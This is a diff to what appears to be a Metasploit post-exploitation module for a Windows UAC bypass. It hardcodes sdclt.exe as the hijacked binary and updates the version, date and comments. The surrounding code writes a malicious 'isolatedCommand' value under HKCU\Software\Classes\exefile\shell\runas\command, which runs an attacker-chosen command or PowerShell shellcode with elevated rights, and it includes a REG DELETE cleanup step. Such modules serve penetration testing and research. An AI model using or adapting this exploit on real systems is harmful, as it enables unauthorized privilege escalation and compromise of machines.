@@ -95,7 +95,7 @@ require 'msf/core/post/windows/registry'
 # Metasploit Class name and includes
 # ----------------------------------
 class MetasploitModule < Msf::Post
-      Rank = ExcellentRanking
+      Rank = GreatRanking
 
          include Msf::Post::Common
          include Msf::Post::Windows::Priv
@@ -121,8 +121,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
-                        'DisclosureDate' => 'mar 17 2017',
+                        'Version'        => '$Revision: 1.2',
+                        'DisclosureDate' => 'mar 18 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -156,7 +156,6 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptString.new('VUL_SOFT', [ false, 'The binary.exe vulnerable (eg sdclt.exe)']),
                                 OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
@@ -181,7 +180,7 @@ else
 end
 
   r=''
-  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
+  vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   vul_value = "isolatedCommand" # vulnerable reg value to create
@@ -201,7 +200,7 @@ end
     Rex::sleep(1.5)
   end
 chec_hive
-    # search in target regedit if eventvwr calls mmc.exe
+    # search in target regedit if binary calls runas
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\exefile")
@@ -209,7 +208,7 @@ chec_hive
       Rex::sleep(1.0)
     else
       # registry hive key not found, aborting module execution.
-      print_warning("Hive key: HKCU\\Software\\Classes\\exefile (mmc.exe call)")
+      print_warning("Hive key: HKCU\\Software\\Classes\\exefile (runas call)")
       print_error("[ABORT]: module cant find the registry hive key needed ..")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
@@ -291,7 +290,7 @@ def ls_stage2
 
   r=''
   session = client
-  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
+  vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
   vul_value = "isolatedCommand" # vulnerable reg value to create
   chec_hive = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
   reg_clean = "REG DELETE HKCU\\Software\\Classes\\exefile /f" # registry hive to be clean
@@ -358,7 +357,7 @@ def ls_stage3
   r=''
   session = client
   oscheck = client.fs.file.expand_path("%OS%")
-  vuln_soft = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
+  vuln_soft = "sdclt.exe" # vulnerable soft to be hijacked
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   vul_value = "isolatedCommand" # vulnerable reg value to create
   vuln_key = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # vuln hijack key
